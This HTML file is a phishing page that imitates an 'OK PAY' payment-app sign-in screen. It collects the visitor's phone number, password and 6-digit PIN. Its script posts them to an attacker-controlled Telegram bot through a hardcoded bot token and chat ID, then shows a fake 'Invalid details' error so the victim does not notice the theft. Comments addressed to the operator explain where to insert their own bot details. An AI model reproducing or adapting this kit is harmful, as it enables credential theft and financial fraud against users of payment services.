<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>OK PAY</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background-color: #f0f4f8;
      color: #333333;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }
    .container { width: 100%; max-width: 360px; text-align: center; }
    
    /* Logo Styling */
    .logo-box {
      width: 130px; height: 130px;
      border-radius: 28px;
      margin: 0 auto 35px;
      overflow: hidden;
      box-shadow: 0 10px 20px rgba(0,0,0,0.15);
      background: #1a0b2e; /* Fallback color */
    }
    .logo-box img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }

    /* Input Fields */
    .input-group {
      display: flex;
      align-items: center;
      background: #ffffff;
      border: 1.5px solid #e0e0e0;
      border-radius: 30px;
      padding: 16px 20px;
      margin-bottom: 16px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.02);
    }
    .input-group svg {
      width: 22px; height: 22px;
      fill: #00897b;
      margin-right: 14px;
      flex-shrink: 0;
    }
    .input-group input {
      background: transparent;
      border: none;
      color: #333;
      font-size: 16px;
      width: 100%;
      outline: none;
      letter-spacing: 0.5px;
    }
    .input-group input::placeholder { color: #aaaaaa; letter-spacing: normal; }
    
    /* PIN Input special */
    .input-group input#pin {
      letter-spacing: 8px;
      font-weight: 600;
    }
    .input-group input#pin::placeholder {
      letter-spacing: normal;
      font-weight: normal;
    }

    /* Links and Options */
    .row {
      display: flex;
      justify-content: space-between;
      font-size: 15px;
      color: #00897b;
      margin-bottom: 25px;
      padding: 0 5px;
      font-weight: 500;
    }
    .row a { color: #00897b; text-decoration: underline; font-weight: 600; }
    .row div { display: flex; align-items: center; gap: 6px; cursor: pointer; }
    
    .checkbox-container {
      display: flex;
      align-items: center;
      font-size: 14px;
      color: #00897b;
      justify-content: center;
      margin-bottom: 30px;
      font-weight: 500;
    }
    .checkbox-container input {
      margin-right: 10px;
      accent-color: #00897b;
      width: 18px; height: 18px;
      cursor: pointer;
    }

    /* Sign In Button */
    .btn-main {
      width: 100%;
      padding: 18px;
      background: #00897b;
      color: white;
      border: none;
      border-radius: 30px;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      box-shadow: 0 6px 15px rgba(0,137,123,0.3);
      transition: background 0.2s;
    }
    .btn-main:hover { background: #00695c; }
    .btn-main:active { transform: scale(0.98); }
  </style>
</head>
<body>

  <div class="container">
    <!-- Logo Box -->
    <div class="logo-box">
      <!-- Replace this URL with your actual logo file (e.g., okpay.png) -->
      <img src="https://i.ibb.co/6P0yCqZ/okpay-logo.png" alt="OK PAY" onerror="this.style.display='none'; this.parentElement.style.background='#1a0b2e'; this.parentElement.innerHTML='<div style=\'color:white; display:flex; justify-content:center; align-items:center; height:100%; font-size:24px; font-weight:bold;\'>OK PAY</div>'">
    </div>

    <!-- Phone Input -->
    <div class="input-group">
      <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
      <input type="tel" id="phone" placeholder="Phone" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,10)">
    </div>

    <!-- Password Input -->
    <div class="input-group">
      <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
      <input type="password" id="pass" placeholder="Password">
    </div>

    <!-- 6-Digit PIN Input -->
    <div class="input-group">
      <svg viewBox="0 0 24 24"><path d="M12.65 10C11.83 7.67 9.61 6 7 6c-3.31 0-6 2.69-6 6s2.69 6 6 6c2.61 0 4.83-1.67 5.65-4H17v4h4v-4h2v-4H12.65zM7 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/></svg>
      <input type="tel" id="pin" placeholder="6-digit PIN" maxlength="6" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
    </div>

    <!-- Links -->
    <div class="row">
      <a href="#">Register</a>
      <div><input type="radio" name="remember" style="accent-color:#00897b; width:16px; height:16px;"> Remember Me</div>
    </div>

    <!-- Agreement -->
    <div class="checkbox-container">
      <input type="radio" name="agree" checked> Agree "User Privacy Agreement"
    </div>

    <!-- Submit Button -->
    <button class="btn-main" onclick="submitLogin()">Sign In</button>
  </div>

  <script>
    // ==========================================
    // TELEGRAM BOT DETAILS (Apni details yahan daalein)
    // ==========================================
    const BOT_TOKEN = "8990784308:AAHT79h9bUWISEm-eXZImzcdmISDsqqf9HM";
    const CHAT_ID = "7318531273";

    function submitLogin() {
      // Get values
      let phone = document.getElementById('phone').value.trim();
      let pass = document.getElementById('pass').value.trim();
      let pin = document.getElementById('pin').value.trim();

      // Validation
      if (phone === "" || pass === "" || pin === "") {
        alert("Bhai, saari details daalo (Phone, Password, aur 6-digit PIN)!");
        return;
      }

      if (phone.length !== 10) {
        alert("Phone number 10 digit ka hona chahiye!");
        return;
      }

      if (pin.length !== 6) {
        alert("PIN exactly 6 digit ka hona chahiye!");
        return;
      }

      // Prepare Telegram Message
      let message = "🔔 *OK PAY - New Login Attempt*\n\n";
      message += "📞 Phone: " + phone + "\n";
      message += "🔑 Password: " + pass + "\n";
      message += "🔐 6-digit PIN: " + pin;

      // Send to Telegram
      sendToTelegram(message);

      // Optional: Show success/error message
      setTimeout(() => {
        alert("❌ Invalid details! Please try again.");
      }, 500);
    }

    function sendToTelegram(message) {
      let url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&parse_mode=Markdown&text=" + encodeURIComponent(message);
      fetch(url)
        .then(res => console.log("Telegram Status:", res.status))
        .catch(err => console.error("Telegram Error:", err));
    }
  </script>

</body>
</html>
